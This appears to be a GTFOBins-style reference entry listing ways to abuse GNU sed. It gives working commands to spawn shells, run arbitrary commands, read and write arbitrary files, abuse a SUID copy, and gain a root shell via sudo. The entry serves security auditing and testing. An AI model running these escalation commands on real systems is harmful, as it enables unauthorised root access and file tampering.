---
functions:
  shell:
    - description: GNU version only. Also, this requires `bash`.
      code: sed -n '1e exec sh 1>&0' /etc/hosts
    - description: GNU version only. The resulting shell is not a proper TTY shell.
      code: sed e
  command:
    - description: GNU version only.
      code: sed -n '1e id' /etc/hosts
  file-write:
    - code: |
        LFILE=file_to_write
        sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
  file-read:
    - code: |
        LFILE=file_to_read
        sed '' "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./sed -e '' "$LFILE"
  sudo:
    - description: GNU version only. Also, this requires `bash`.
      code: sudo sed -n '1e exec sh 1>&0' /etc/hosts
---
